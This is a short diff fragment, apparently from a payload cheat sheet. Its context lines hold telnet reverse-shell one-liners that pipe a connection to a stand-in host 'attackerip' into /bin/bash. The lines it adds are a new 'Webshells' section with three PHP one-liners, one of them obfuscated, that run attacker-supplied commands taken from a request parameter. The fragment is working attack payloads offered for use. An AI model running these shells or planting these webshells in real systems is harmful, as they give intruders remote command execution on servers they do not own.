@@ -20,3 +20,8 @@ p.waitFor()
 """
 Telnet----rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
 Telnet----telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   # Remember to listen on your machine also on port 4445/tcp
+
+##Webshells
+PHP (standard)----<?php echo system($_GET['h00p']);?>
+PHP (tiniest)----<?=`{${~a0b8baab}[a0]}`;
+PHP (conditional tiniest)----<?`$_GET[_]`;
